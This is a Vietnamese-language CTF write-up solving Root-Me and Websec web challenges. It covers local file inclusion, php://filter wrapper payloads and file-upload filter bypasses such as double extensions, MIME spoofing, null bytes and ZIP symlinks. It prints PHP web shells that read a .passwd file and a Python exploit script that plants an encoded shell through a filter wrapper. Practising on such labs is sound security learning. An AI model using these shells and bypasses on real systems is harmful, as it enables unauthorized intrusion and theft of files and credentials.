# 1.Local File Inclusion(Root me)
Link challenge : [http://challenge01.root-me.org/web-serveur/ch16/](http://challenge01.root-me.org/web-serveur/ch16/)
#### Statement: Get in the admin section.

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/334048014_3144244362540643_2722104050429279549_n.png?stp=dst-png_p206x206&_nc_cat=104&ccb=1-7&_nc_sid=aee45a&_nc_ohc=4Kilo_bdW0oAX9aYfLD&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQA519HGfHMmgbDg2Qx2l2JhtlPVPIK0H4uICEqT-eX9w&oe=6423A012)

Web này có một số trang như:
`http://challenge01.root-me.org/web-serveur/ch16/?files=sysadm`

Bây giờ mình cần liệt kê các thư mục gốc:
`http://challenge01.root-me.org/web-serveur/ch16/?files=../`

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/334066589_887494869185478_357094037800551696_n.png?stp=dst-png_s403x403&_nc_cat=111&ccb=1-7&_nc_sid=aee45a&_nc_ohc=SIZWVZ5R0kgAX-5NVTE&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTuwfnvlo7f2PsrrQgUV3fOM4HHm2_G6jnqgX6JCOIyag&oe=64236BA1)

Ở đây có phần `admin` nên mình cần truy cập vào thư mục này
`http://challenge01.root-me.org/web-serveur/ch16/?files=../admin`

Mình nhận được file `index.php` mình mở lên sẽ nhận được thông tin đăng nhập tài khoản admin.

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/333600122_1322559018401743_7622876876755481784_n.png?_nc_cat=106&ccb=1-7&_nc_sid=aee45a&_nc_ohc=UHs5djOPhkYAX8MLzpy&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdThVpq_vP90X_pCyGSeOe7OVVsaxT11W99HANmCj7VDGg&oe=64239553)

# 2.Local File Inclusion - Double encoding(Root me)
Link challenge : [http://challenge01.root-me.org/web-serveur/ch45/](http://challenge01.root-me.org/web-serveur/ch45/)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/333506032_1317539442146712_2354584585538102562_n.png?stp=dst-png_p206x206&_nc_cat=110&ccb=1-7&_nc_sid=aee45a&_nc_ohc=gVPGuLDcBQYAX_oiWYi&_nc_oc=AQlas4tiUG7_EzBIT7EKXOoyTONZ22ZcOzoRHLafrZmLCJphf-z9tZrjUskch16QgADh0crATQqpPg22evNFO-yR&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdT-cigtYztLezXHnF9zSEPgxfn9aHpvTq_qNLDaep3Egg&oe=64237D69)

Mình thử nhâp như câu trên:
`http://challenge01.root-me.org/web-serveur/ch45/index.php?page=../`

thì hiện thị `attack detected` có vẻ ở đây họ đã filter.
Mình cũng đã thử `double encode` `../ = %252e%252e%252f` những vẫn không được.

Sau khi tìm hiểu thêm thì bài này không giống bài trước,phải sử dụng kỹ thuật khai thác LFI khác `php wrapper`

Ở đây mình cần tim resource nên sử dụng payload: 
`php://filter/convert.base64-encode/resource=cv`

Mình cần double encode payload ở trên:
`php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv`

Sau đó mình nhận được một chuỗi `base64` mình decode ra thì nhận được một file `conf.inc.php`
```PHP
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - CV</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home">Home</a>
      <a href="index.php?page=cv" class="active">CV</a>
      <a href="index.php?page=contact">Contact</a>
    </nav>
    <h1><?= $conf['contact']['firstname'] ?> <?= $conf['contact']['lastname'] ?></h1>
    <h3>Professional doer</h3>
    <?= $conf['cv']['gender'] ? "Male" : "Female" ?><br>
    <?= date('Y/m/d', $conf['cv']['birth']) ?> (<?= date('Y')-date('Y', $conf['cv']['birth']) ?>)
    <?php
      foreach ($conf['cv']['jobs'] as $job) {
    ?>
      <div class="job">
        <h4><?= $job['title'] ?> - <span class="date"><?= $job['date'] ?></span></h4>
      </div>
    <?php
      }
    ?>
  </body>
</html>
```
Mình gửi tiếp payload :
`php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf`

Nhận được một chuỗi base64 và decode ra mình nhận được flag:
```PHP
    "flag" => "Th1sIsTh3Fl4g!",
    "home" => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
```
# 3.File upload - Double extensions(Root me)
Link challenge : [http://challenge01.root-me.org/web-serveur/ch20/](http://challenge01.root-me.org/web-serveur/ch20/)

#### Statement
Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd at the root of the application.

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/333943514_6350983044947574_8012559699798614740_n.png?stp=dst-png_p206x206&_nc_cat=109&ccb=1-7&_nc_sid=aee45a&_nc_ohc=X0xn5V1LWGgAX-j0ElN&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTcMhltnO76zY5mypSbuBdlMoCVnrNVq5ec4AOdrkb5AA&oe=6423A193)

Mục đích của bài này là đọc file `.passwd` nên mình cần viết một shell php:
```Php
<?php
System("
    ls -la ../;
");
?>
```
Mình upload file `shell.php` thì thấy thông báo lỗi `Wrong file extension !` vì nó chỉ cho upload các extension như .png, .jpeg, .gif  nên mình thử sửa lại tên file `shell.php.png` up lên thử thì ok.

Nhiệm vụ bài này là đọc file ẩn `.passwd` nên mình cần `-la` để list ra các file ẩn trong directory.Mình thử nhiều lần thì tìm được chỗ có file `.passwd`
```Php
<?php
System("
    ls -la ../../../;
");
?>
```
Sau đấy mình cần đọc nội dung của file,mình chỉnh lại shell một chút:
```Php
<?php
System("
    cat ../../../.passwd;
");
?>
```
>Flag: Gg9LRz-hWSxqqUKd77-_q-6G8

# 4.File upload - MIME type(Root me)
Link challenge : [http://challenge01.root-me.org/web-serveur/ch21/?action=upload](http://challenge01.root-me.org/web-serveur/ch21/?action=upload) 
#### Statement
Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd at the root of the application.

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/333980074_234013948963711_6646913816306690753_n.png?stp=dst-png_s320x320&_nc_cat=106&ccb=1-7&_nc_sid=aee45a&_nc_ohc=wqSs7EbybtIAX80kKwh&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTjbw0YUAM2ONwj3cigdfZ1ORCX9CPMewPXszUDcd-GLg&oe=6423C7CF)

Bài này đề bài tương tự như câu trên là upload file php để đọc file `.passwd`.Viết shell php đơn giản:
```PHP
<?php
System("
    ls -la ../;
");
?>
```
Mình thử up lên thì nhận được `Wrong file type !` như vậy bài nay đang bắt `type` của file nên mình cần phải chỉnh `content-file` thành các định dạng như image/jpeg...
Sau đó up lên thì thành công.
Bây giờ mình cần tìm xem file `.passwd` ở đâu.
```Php
<?php
System("
    cat ../../../.passwd;
");
?>
```
>Flag : a7n4nizpgQgnPERy89uanf6T4

# 5.File upload - Null byte(Root me)
Link challenge : [http://challenge01.root-me.org/web-serveur/ch22/?galerie=upload](http://challenge01.root-me.org/web-serveur/ch22/?galerie=upload)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/328001724_1883100512062136_8778815827088973325_n.png?stp=dst-png_p206x206&_nc_cat=107&ccb=1-7&_nc_sid=aee45a&_nc_ohc=oAyPVf6emawAX-6hO2K&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRujXT5KHNyFKRDyTGXKct1Uom0WlJi2-MFmb7YM9Mzmg&oe=6423ADDC)

Ban đầu mình cũng phải viết 1 shell php đơn giản:
```Php
<?php
System("
    ls -la ../;
");
?>
```
Sau khi up lên thì ta nhận được thông báo lỗi `Wrong file type !` nên mình thử chỉnh lên type như bài trên thử xem.

Sau khi up lại thì ta lại nhận được thông báo lỗi `Wrong extension!` như vậy bài này mình phải chỉnh cả 2.

Mình có đổi tên file `shell.php.jpg` thì nhận nhận được `wrong file name` 

Bây giờ mình chi còn cách truyền `null byte` là kỹ thuật bỏ qua để dữ liệu sẽ được lọc theo cách khác,chấm dứt chuỗi.

Payload sẽ là:
```
filename="shell.php%00.jpg"
Content-Type: image/jpeg
```
Mình đã upload thành công,bây giờ tương tự như mấy bài trước mình cần tìm và đọc file `.passwd`
```Php
<?php
System("
    cat ../../../.passwd;
");
?>
```
>Flag : YPNchi2NmTwygr2dgCCF
# 6.File upload - ZIP(Root me)
Link challenge : [http://challenge01.root-me.org/web-serveur/ch51/index.php](http://challenge01.root-me.org/web-serveur/ch51/index.php)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/334043103_572728071556238_6859132648529030180_n.png?stp=dst-png_p206x206&_nc_cat=109&ccb=1-7&_nc_sid=aee45a&_nc_ohc=wp_vuGzJw2UAX9dk5Ij&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQk3MalSekhK7KWRi0nDXt-MkkqSMqxhiqdoaNbN-vp8A&oe=6423DC73)

Đề bài là mình upload 1 file zip lên và đọc được file `index.php`
Sau khi mình up thử thì:
+ Server đổi tên của file zip
+ Không mở được file php(chỉ được các file document,jpeg)

Bài này sau khi xem qua writeup của 1 số trang thì mình thấy phải dùng `symlink`.

Symlink là một liên kết đến một tập tin hoặc thư mục khác trên cùng hệ thống tập tin, cho phép người dùng truy cập đến tập tin hoặc thư mục đó một cách dễ dàng và tiện lợi hơn.

Đầu tiên chúng ta cần tạo một liên kết để tới file `index.php`
```Shell
ln -s ../../../index.php test.txt
```
Ở đây mình tạo 1 symbolic link có tên là `test.txt` trỏ tới tập tin `../../../index.php`

Tiếp đến mình cần zip file:
```Shell
zip -y test.zip test.txt
```
Sau đấy mình thử up lên thì được bấm vào file thì mình nhận được flag:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/333989424_1516768615497480_1715515493448679962_n.png?_nc_cat=102&ccb=1-7&_nc_sid=aee45a&_nc_ohc=5zA_8mxVpUkAX93gtm_&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdR5J2WJ58JG5hpVIlnE-_xpOwjRh0yHQM3cqsTVMdJO-Q&oe=6423F684)

>Flag : N3v3r_7rU5T_u5Er_1npU7
# 7.Level TwentyFour(Websec)
Link challenge : [https://websec.fr/level24/index.php](https://websec.fr/level24/index.php)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/329719001_1403439540404244_6218750567474320363_n.png?stp=dst-png_p206x206&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=iIhTLTn9LAkAX_duKFp&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSHgSPUtrnmps2IpEYQZFkjkvwGtDM40OnDfWxFo869Ww&oe=6423F397)
```Php
if (isset($_GET['p']) && isset($_GET['filename']) ) {
    $filename = $_GET['filename'];
    if ($_GET['p'] === "edit") {
        $p = "edit";
        if (isset($_POST['data'])) {
            $data = $_POST['data'];
            if (strpos($data, '<?')  === false && stripos($data, 'script')  === false) {  # no interpretable code please.
                file_put_contents($_GET['filename'], $data);
                die ('<meta http-equiv="refresh" content="0; url=.">');
            }
        } elseif (file_exists($_GET['filename'])){
            $data = file_get_contents($_GET['filename']);
        }
    }
}
```
Sau khi tạo file xong thì mình cần tạo nội dung cho file.Ở đây nó đã lọc các ký tự `<?,script`.

Với hàm `strpos` nó kiểm tra xem chuỗi `<?` có tồn tại trong data không,nếu có thì return `true`.

Mà đang xét `strpos($data,'<?)===false` vì thế để điều kiện đúng thì chuỗi  `<?` không được nằm trong `$data`

Với hàm `stripos` thì tương tự như `strpos` nhưng nó không phân biệt chữ hoa chữ thường.

Để chèn shell php thì mình cần phải có chuỗi `<?`,sau một lúc suy nghĩ không ra  mình lên mạng search xem thì có cách là dùng `wrappers`.

Đó là mình nhập data đã mã hóa và khi gửi lên mình cần mã hóa ngược lại.

Mình tạo 1 file php `shell.php`
```Php
<?php 
echo "hacked";
?>
// khi encode sẽ thành là 
// PD9waHAgCmVjaG8gImhhY2tlZCI7Cj8+
```
Sau khi up lên mình cần chỉnh file name để có thế `decode` lại được

Dùng `burpsuite` để sửa request sẽ là:
![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/333584463_1400441273829343_9025077661547208896_n.png?_nc_cat=111&ccb=1-7&_nc_sid=aee45a&_nc_ohc=_3dTXGYiZyUAX8PMfXl&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQL_bwTOSKyMazWMm75L_yOsHot7sUtUwRD8YAindENtg&oe=6426DC68)

Bây giờ mình cần chạy shell:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/332135716_687205076538584_1590923894014400211_n.png?_nc_cat=109&ccb=1-7&_nc_sid=aee45a&_nc_ohc=sRU3U5vUNzEAX-xYgoy&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdT57a7JUkftvxIArQctjVmnN7-hL3P2mx5NuPvjPpB1-Q&oe=6426E66D)

Như vậy chúng ta đã chạy shell thành công và cần tìm file chứa flag.

Mình thấy mỗi lần thử phải `encode` nên mình có viết script để nhanh hơn.
#### Python
```Python
import requests
import base64

header = {"Cookie":"PHPSESSID=2epup0ad23d2o6ufsks4bg24gtkm5103"}
def exploit(payload,payload2):

    url = "http://websec.fr/level24/index.php?p=edit&filename="+payload

    headers=header

    data = {"data":payload2}

    result = requests.post(url,headers=headers,data=data).text

    print(result)

payload = "php://filter/convert.base64-decode/resource=shell.php"

payload2 = base64.b64encode(b"<?php $a = scandir('../../');print_r($a); ?>");

exploit(payload,payload2)
```
Bài này mình có thử dùng `system,exec` nhưng có vẻ như đều bị chặn,nên mình có tìm hiểu thì có thế dùng hàm `scandir` để return list file trong folder.

Và để hiện thị thông tin lên trình duyệt mình cần phải sử dụng hàm `var_dump hoặc print_r`.

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/332070183_1557252364758367_3072424166117698545_n.png?_nc_cat=111&ccb=1-7&_nc_sid=aee45a&_nc_ohc=6V2Q62a08tIAX_rCDFh&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTW6AxJBJs1rx3GV6j8KgsscctTEZZLs4S_ZAbGHceHQQ&oe=6426D78A)

Mình tìm thấy được file `flag.php`,cần chỉnh lại script để đọc file:

#### Python
```Python
import requests
import base64

header = {"Cookie":"PHPSESSID=2epup0ad23d2o6ufsks4bg24gtkm5103"}
def exploit(payload,payload2):

    url = "http://websec.fr/level24/index.php?p=edit&filename="+payload

    headers=header

    data = {"data":payload2}

    result = requests.post(url,headers=headers,data=data).text

    print(result)

payload = "php://filter/convert.base64-decode/resource=shell.php"

payload2 = base64.b64encode(b"<?php echo file_get_contents('../../flag.php'); ?>");

exploit(payload,payload2)
```
Sau khi up lên và mở thì mình nhận được 1 trang trắng,sau đó mình `ctrl-U` thì sẽ thấy nội dung ma nó `comment`:
```Php
// WEBSEC{no_javascript_no_php_I_guess_you_used_COBOL_to_get_a_RCE_right?}
```
